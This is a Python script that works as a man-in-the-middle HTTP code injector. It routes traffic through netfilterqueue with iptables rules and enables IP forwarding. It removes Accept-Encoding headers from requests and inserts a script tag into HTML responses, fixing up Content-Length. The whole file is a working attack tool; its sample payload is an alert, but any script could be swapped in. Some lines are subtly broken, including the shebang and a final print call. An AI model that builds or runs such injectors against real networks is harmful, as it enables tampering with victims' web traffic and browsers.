#!usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import subprocess
import re


def set_load(packet, load):
    print("[+] Replacing file")
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def modify_load(replacement_for, load):
    replacement_for = replacement_for[0].encode()
    replaced_by = ""
    replaced_by = replaced_by.encode()
    return re.sub(replacement_for, replaced_by, load)


def queue_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet.haslayer(scapy.TCP):
            if scapy_packet[scapy.TCP].dport == 80:
                print("\n[+] Request")
                load = str(scapy_packet[scapy.Raw].load)
                #print(load)
                replace_load = re.findall(r"Accept-Encoding:.*?\\r\\n", load)
                if replace_load:
                    modified_load = modify_load(
                        replace_load, scapy_packet[scapy.Raw].load)
                    temp_packet = set_load(scapy_packet, modified_load)
                    packet.set_payload(bytes(temp_packet))
            elif scapy_packet[scapy.TCP].sport == 80:
                print("\n[+] Response")
                modified_load = scapy_packet[scapy.Raw].load
                print("\n--------------------------------------------")
                from_str = b"</body>"
                to_str = b"<script>alert('Warning Hacked');</script></body>"
                modified_load = modified_load.replace(from_str, to_str)
                injection_code = "<script>alert('Warning Hacked');</script>"
                load_res = str(scapy_packet[scapy.Raw].load)
                #print(load_res)
                content_length = re.search(
                    "(?:Content-Length:\s)(\d*)", load_res)
                if content_length and b"text/html" in modified_load:
                    new_len = len(injection_code) + int(content_length[1])
                    new_len = str(new_len).encode()
                    content_length = str(content_length[1]).encode()
                    print(content_length)
                    modified_load = modified_load.replace(
                        content_length, new_len)
                temp_packet = set_load(scapy_packet, modified_load)
                temp_packet.show()
                packet.set_payload(bytes(temp_packet))
                print(packet.haslayer(scapy.Raw).load)
    packet.accept()


try:
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, queue_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] Resetting and Exciting")
    subprocess.call("iptables --flush", shell=True)
